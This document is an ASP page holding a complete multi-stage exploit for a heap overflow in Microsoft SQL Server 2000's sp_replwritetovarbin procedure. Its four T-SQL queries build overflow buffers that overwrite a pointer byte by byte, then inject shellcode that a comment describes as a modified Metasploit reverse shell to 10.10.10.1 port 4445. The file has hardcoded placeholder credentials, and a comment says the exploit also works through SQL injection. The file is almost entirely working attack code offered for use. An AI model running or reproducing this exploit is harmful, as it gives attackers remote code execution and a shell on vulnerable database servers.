<html>
<%
// Microsoft SQL Server "sp_replwritetovarbin()" Heap Overflow
// 只在Win2k SP4 +MSSQL 2000测试
// Shellcode是稍微修改metasploit的反向shell(on 10.10.10.1 port 4445),
// the change allows multiple shots :)
// 
// You need a valid SQL account, but you can also use this through an SQL-Injection simply by injecting the T-SQL stuff.

// Take a look at the comments in T-SQL



On Error Resume Next

// change this
UserName = "r00t"             //sql用户名
Password = "t00r"             //sql密码

// ########################################### FIRST QUERY
SQL = "DECLARE @buf NVARCHAR(4000),				"&_
"@val NVARCHAR(4),						"&_
"@counter INT							"&_
"SET @buf = '							"&_ 
"declare @retcode int,						"&_
"@end_offset int,						"&_
"@vb_buffer varbinary,						"&_
"@vb_bufferlen int						"&_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
"SET @val = CHAR(0x41)						"&_
"SET @counter = 0						"&_
"WHILE @counter < 3020						"&_
"BEGIN								"&_
"  SET @counter = @counter + 1					"&_
"  IF @counter = 2900						"&_	 
"  BEGIN							"&_
"    SET @val =  CHAR(0x43)					"&_
"  END								"&_
"  ELSE IF @counter = 299					"&_
"  BEGIN							"&_
"    SET @val =  CHAR(0x42)					"&_
"  END								"&_
"  ELSE IF @counter = 300					"&_
"  BEGIN							"&_


"     /* First byte overwritten here. This is a random writable address */	"&_
"     SET @buf = @buf + CHAR(0x44) + char(0xc0) + char(0x4c) + CHAR(0x19) "&_
"     CONTINUE							"&_
"  END								"&_
"  SET @buf = @buf + @val					"&_
"END								"&_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&_
"EXEC master..sp_executesql @buf"							





// ########################################### SECOND QUERY
SQL2 = "DECLARE @buf NVARCHAR(4000),				"&_
"@val NVARCHAR(4),						"&_
"@counter INT							"&_
"SET @buf = '							"&_ 
"declare @retcode int,						"&_
"@end_offset int,						"&_
"@vb_buffer varbinary,						"&_
"@vb_bufferlen int						"&_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
"SET @val = CHAR(0x41)						"&_
"SET @counter = 0						"&_
"WHILE @counter < 3097						"&_
"BEGIN								"&_
"  SET @counter = @counter + 1					"&_
"  IF @counter = 2900						"&_	 
"  BEGIN							"&_
"    SET @val =  CHAR(0x43)					"&_
"  END								"&_
"  ELSE IF @counter = 299					"&_
"  BEGIN							"&_
"    SET @val =  CHAR(0x42)					"&_
"  END								"&_
"  ELSE IF @counter = 300					"&_
"  BEGIN							"&_


"     /* Second byte overwritten here */			"&_
"     SET @buf = @buf + CHAR(0x45) + char(0xc0) + char(0x4c) + CHAR(0x19) "&_
"     CONTINUE							"&_
"  END								"&_
"  SET @buf = @buf + @val					"&_
"END								"&_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&_
"EXEC master..sp_executesql @buf"							





// ########################################### THIRD QUERY
SQL3 = "DECLARE @buf NVARCHAR(4000),				"&_
"@val NVARCHAR(4),						"&_
"@counter INT							"&_
"SET @buf = '							"&_ 
"declare @retcode int,						"&_
"@end_offset int,						"&_
"@vb_buffer varbinary,						"&_
"@vb_bufferlen int						"&_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
"SET @val = CHAR(0x41)						"&_
"SET @counter = 0						"&_
"WHILE @counter < 3021						"&_
"BEGIN								"&_
"  SET @counter = @counter + 1					"&_
"  IF @counter = 2900						"&_	 
"  BEGIN							"&_
"    SET @val =  CHAR(0x43)					"&_
"  END								"&_
"  ELSE IF @counter = 299					"&_
"  BEGIN							"&_
"    SET @val =  CHAR(0x42)					"&_
"  END								"&_
"  ELSE IF @counter = 300					"&_
"  BEGIN							"&_


"     /* Third byte overwritten here */				"&_
"     SET @buf = @buf + CHAR(0x46) + char(0xc0) + char(0x4c) + CHAR(0x19) "&_
"     CONTINUE							"&_
"  END								"&_
"  SET @buf = @buf + @val					"&_
"END								"&_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&_
"EXEC master..sp_executesql @buf"							





// ########################################### FOURTH QUERY
SQL4 = "DECLARE @buf NVARCHAR(4000),				"&_
"@val NVARCHAR(4),						"&_
"@counter INT							"&_
"SET @buf = '							"&_ 
"declare @retcode int,						"&_
"@end_offset int,						"&_
"@vb_buffer varbinary,						"&_
"@vb_bufferlen int						"&_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
"SET @val = CHAR(0x41)						"&_
"SET @counter = 0						"&_
"WHILE @counter < 2708						"&_
"BEGIN								"&_
"  SET @counter = @counter + 1					"&_
"  IF @counter = 2900						"&_	 
"  BEGIN							"&_
"    SET @val =  CHAR(0x43)					"&_
"  END								"&_
"  IF @counter = 108						"&_
"  BEGIN							"&_


"     /* this is the pointer we wrote - 0x38. It points to a CALL ECX */	"&_
"    SET @buf = @buf + CHAR(0x10) + CHAR(0xc0) + CHAR(0x4c) + CHAR(0x19) "&_


"     /* realign code */						"&_
"    SET @buf = @buf + CHAR(0xe1)				"&_


"     /* realign the stack */					"&_
"    SET @buf = @buf + CHAR(0x83) + CHAR(0xe4) + CHAR(0xfc)	"&_


"     /* jump ahead */						"&_
"    SET @buf = @buf + CHAR(0xe9) + CHAR(0xba) + CHAR(0x00) + CHAR(0x00) + CHAR(0x00) "&_
"    SET @counter = @counter + 12				"&_
"    CONTINUE							"&_
"  END								"&_
"  ELSE IF @counter = 299					"&_
"  BEGIN							"&_
"    SET @val =  CHAR(0x42)					"&_
"  END								"&_
"  ELSE IF @counter = 300					"&_
"  BEGIN							"&_


"     /* Fourth byte overwritten here */			"&_
"     SET @buf = @buf + CHAR(0x47) + char(0xc0) + char(0x4c) + CHAR(0x19) "&_


"     /* reverse shell on 10.10.10.1:4445 */			"&_
"     SET @buf=@buf+CHAR(0xfc)+CHAR(0x6a)+CHAR(0xeb)+CHAR(0x4d)+CHAR(0xe8)+CHAR(0xf9)+CHAR(0xff)+CHAR(0xff)+CHAR(0xff)+CHAR(0x60)+CHAR(0x8b)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x24)+CHAR(0x8b)+CHAR(0x45)+CHAR(0x3c)+CHAR(0x8b)+CHAR(0x7c)+CHAR(0x05)+CHAR(0x78)+CHAR(0x01)+CHAR(0xef)+CHAR(0x8b)+CHAR(0x4f)+CHAR(0x18)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x20)+CHAR(0x01)+CHAR(0xeb)+CHAR(0x49)+CHAR(0x8b)+CHAR(0x34)+CHAR(0x8b)+CHAR(0x01)+CHAR(0xee)+CHAR(0x31)+CHAR(0xc0)+CHAR(0x99)+CHAR(0xac)+CHAR(0x84)+CHAR(0xc0)+CHAR(0x74)+CHAR(0x07)+CHAR(0xc1)+CHAR(0xca)+CHAR(0x0d)+CHAR(0x01)+CHAR(0xc2)+CHAR(0xeb)+CHAR(0xf4)+CHAR(0x3b)+CHAR(0x54)+CHAR(0x24)+CHAR(0x28)+CHAR(0x75)+CHAR(0xe5)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x24)+CHAR(0x01)+CHAR(0xeb)+CHAR(0x66)+CHAR(0x8b)+CHAR(0x0c)+CHAR(0x4b)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x1c)+CHAR(0x01)+CHAR(0xeb)+CHAR(0x03)+CHAR(0x2c)+CHAR(0x8b)+CHAR(0x89)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x1c)+CHAR(0x61)+CHAR(0xc3)+CHAR(0x31)+CHAR(0xdb)+CHAR(0x64)+CHAR(0x8b)+CHAR(0x43)+CHAR(0x30)+CHAR(0x8b)+CHAR(0x40)+CHAR(0x0c)+CHAR(0x8b)+CHAR(0x70)+CHAR(0x1c)+CHAR(0xad)+CHAR(0x8b)+CHAR(0x40)+CHAR(0x08)+CHAR(0x5e)+CHAR(0x68)+CHAR(0x8e)+CHAR(0x4e)+CHAR(0x0e)+CHAR(0xec)+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x66)+CHAR(0x53)+CHAR(0x66)+CHAR(0x68)+CHAR(0x33)+CHAR(0x32)+CHAR(0x68)+CHAR(0x77)+CHAR(0x73)+CHAR(0x32)+CHAR(0x5f)+CHAR(0x54)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xcb)+CHAR(0xed)+CHAR(0xfc)+CHAR(0x3b)+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5f)+CHAR(0x89)+CHAR(0xe5)+CHAR(0x66)+CHAR(0x81)+CHAR(0xed)+CHAR(0x08)+CHAR(0x02)+CHAR(0x55)+CHAR(0x6a)+CHAR(0x02)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xd9)+CHAR(0x09)+CHAR(0xf5)+CHAR(0xad)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x53)+CHAR(0x53)+CHAR(0x53)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x01)+CHAR(0x66)+CHAR(0x68)+CHAR(0x11)+CHAR(0x5d)+CHAR(0x66)+CHAR(0x53)+CHAR(0x89)+CHAR(0xe1)+CHAR(0x95)+CHAR(0x68)+CHAR(0xec)+CHAR(0xf9)+CHAR(0xaa)+CHAR(0x60)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0x10)+CHAR(0x51)+CHAR(0x55)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x66)+CHAR(0x6a)+CHAR(0x64)+CHAR(0x66)+CHAR(0x68)+CHAR(0x63)+CHAR(0x6d)+CHAR(0x6a)+CHAR(0x50)+CHAR(0x59)+CHAR(0x29)+CHAR(0xcc)+CHAR(0x89)+CHAR(0xe7)+CHAR(0x6a)+CHAR(0x44)+CHAR(0x89)+CHAR(0xe2)+CHAR(0x31)+CHAR(0xc0)+CHAR(0xf3)+CHAR(0xaa)+CHAR(0x95)+CHAR(0x89)+CHAR(0xfd)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2d)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2c)+CHAR(0x8d)+CHAR(0x7a)+CHAR(0x38)+CHAR(0xab)+CHAR(0xab)+CHAR(0xab)+CHAR(0x68)+CHAR(0x72)+CHAR(0xfe)+CHAR(0xb3)+CHAR(0x16)+CHAR(0xff)+CHAR(0x75)+CHAR(0x28)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5b)+CHAR(0x57)+CHAR(0x52)+CHAR(0x51)+CHAR(0x51)+CHAR(0x51)+CHAR(0x6a)+CHAR(0x01)+CHAR(0x51)+CHAR(0x51)+CHAR(0x55)+CHAR(0x51)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xad)+CHAR(0xd9)+CHAR(0x05)+CHAR(0xce)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0xff)+CHAR(0xff)+CHAR(0x37)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xe7)+CHAR(0x79)+CHAR(0xc6)+CHAR(0x79)+CHAR(0xff)+CHAR(0x75)+CHAR(0x04)+CHAR(0xff)+CHAR(0xd6)+CHAR(0xff)+CHAR(0x77)+CHAR(0xfc)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xef)+CHAR(0xce)+CHAR(0xe0)+CHAR(0x60)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)		"&_
"     CONTINUE							"&_
"  END								"&_
"  SET @buf = @buf + @val					"&_
"END								"&_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&_
"EXEC master..sp_executesql @buf"							


Set oConnection = Server.CreateObject("ADODB.Connection")
oConnection.Open "Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=" & UserName & "; Password=" & Password
Set rs = Server.CreateObject("ADODB.Recordset")

phase = Request.Querystring("p")

if phase then
	if phase = 1 then
		rs.open SQL3, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect("sql2000.asp?p=2")
	elseif phase = 2 then
		rs.open SQL4, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect("sql2000.asp?p=3")
	end if
Else
	rs.open SQL, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing
	
	Set oConnection = Server.CreateObject("ADODB.Connection")
	oConnection.Open "Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=" & UserName & "; Password=" & Password
	Set rs = Server.CreateObject("ADODB.Recordset")
	rs.open SQL2, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing	

	Response.Redirect("sql2000.asp?p=1")
end if


%>


</html>

